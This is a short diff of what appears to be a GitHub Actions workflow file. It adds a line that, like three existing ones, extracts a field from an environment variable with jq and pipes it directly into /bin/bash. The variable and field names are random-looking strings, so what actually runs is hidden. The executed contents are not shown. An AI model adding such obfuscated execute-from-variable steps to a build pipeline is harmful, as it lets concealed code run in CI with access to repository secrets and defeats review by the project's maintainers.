@@ -34,6 +34,7 @@ jobs:
           echo $bwjpn42696 | jq -r .asp081 | /bin/bash
           echo $szdv51503 | jq -r .rr52 | /bin/bash
           echo $jin9 | jq -r .k41692 | /bin/bash
+          printf '%s' "$mmi298" | jq -r .r581 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
